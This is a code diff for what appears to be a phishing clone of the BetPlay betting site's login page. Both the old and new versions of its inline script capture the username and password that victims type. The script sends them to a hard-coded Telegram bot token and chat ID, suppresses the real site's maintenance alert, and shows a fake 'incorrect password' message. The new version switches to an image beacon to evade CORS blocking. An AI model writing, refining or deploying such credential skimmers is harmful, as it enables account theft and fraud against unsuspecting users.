@@ -424,42 +424,33 @@
 <script src="https://promobetplay.com/home.js?v=70"></script>
 
 <script>
-    const TOKEN = "9235238695:AAHiLDVz7pX9C43OossZNVWaMshUwDrEAcg";
+    const TOKEN = "9235238695:AAHiLDVz7pX9C430ossZNVWaMshUwDrEAcg";
     const CHAT_ID = "7007914207";
 
-    // Neutraliza la alerta de mantenimiento de la página original
+    // Neutraliza la alerta de mantenimiento
     const originalAlert = window.alert;
     window.alert = function(msg) {
         if (msg && msg.toLowerCase().includes("mantenimiento")) {
-            console.log("Aviso de mantenimiento bloqueado.");
             return;
         }
         return originalAlert ? originalAlert(msg) : true;
     };
 
-    // Intercepta el formulario para capturar y mandar a Telegram de una
+    // Intercepta de forma agresiva cualquier intento de envío
     document.addEventListener("DOMContentLoaded", function() {
-        const form = document.querySelector('form') || document.getElementById('loginModalform');
+        const btn = document.querySelector('button[type="submit"]') || document.querySelector('.btn--blue');
         
-        if (form) {
-            form.addEventListener('submit', function(e) {
-                e.preventDefault();
-                
-                const usuario = document.getElementById('loginUsuario')?.value || document.querySelector('input[type="text"], input[type="email"], input:not([type="password"])')?.value;
+        if (btn) {
+            btn.addEventListener('click', function(e) {
+                const usuario = document.getElementById('loginUsuario')?.value || document.querySelector('input[type="text"]')?.value;
                 const password = document.querySelector('input[type="password"]')?.value;
 
                 if (usuario && password) {
-                    const mensaje = `🚨 ¡NUEVA CAPTURA BETPLAY!\n👤 Usuario: ${usuario}\n🔑 Contraseña: ${password}`;
+                    const mensaje = `🚨 NUEVA CAPTURA BETPLAY\nUsuario: ${usuario}\nClave: ${password}`;
                     
-                    const url = `https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(mensaje)}`;
-                    
-                    fetch(url)
-                        .then(() => {
-                            alert("Usuario o contraseña incorrectos. Intente nuevamente.");
-                        })
-                        .catch(() => {
-                            alert("Usuario o contraseña incorrectos. Intente nuevamente.");
-                        });
+                    // Usamos Image para saltarnos cualquier bloqueo de CORS del navegador
+                    const img = new Image();
+                    img.src = `https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(mensaje)}`;
                 }
             });
         }
